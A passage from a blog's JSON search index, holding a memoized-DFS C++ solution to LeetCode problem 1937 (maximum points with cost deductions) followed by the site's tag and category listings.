扣分后的最大得分1937.扣分后的最大得分 1234567891011121314151617181920212223242526272829303132333435363738class Solution { int m; int n;public: long long maxPoints(vector&lt;vector&lt;int&gt;&gt;&amp; points) { m = points.size(), n = points[0].size(); vector&lt;vector&lt;long long&gt;&gt; grads(m, vector&lt;long long&gt;(n, -1)); long long res = -INT_MAX; for(int j = 0; j &lt; n; j++) { res = max(res, dfs(0, j, points, grads)); } return res; } long long dfs(int x, int y, vector&lt;vector&lt;int&gt;&gt;&amp; points, vector&lt;vector&lt;long long&gt;&gt;&amp; grads) { if (x == m - 1) { return points[x][y]; } long long&amp; num = grads[x][y]; if (num != -1) return num; num = LLONG_MIN; for (int j = 0; j &lt; n; j++) { num = max(num, dfs(x + 1, j, points, grads) - abs(j - y)); } num += points[x][y]; return num; }};","link":"/posts/d4db4340.html"}],"tags":[{"name":"hyperloglog","slug":"hyperloglog","link":"/tags/hyperloglog/"},{"name":"动态规划","slug":"动态规划","link":"/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"滑动窗口","slug":"滑动窗口","link":"/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"},{"name":"双指针","slug":"双指针","link":"/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"}],"categories":[{"name":"CSAPP","slug":"CSAPP","link":"/categories/CSAPP/"},{"name":"cmu15455-2024fall","slug":"cmu15455-2024fall","link":"/categories/cmu15455-2024fall/"},{"name":"leetcode","slug":"leetcode","link":"/categories/leetcode/"}],"pages":[]}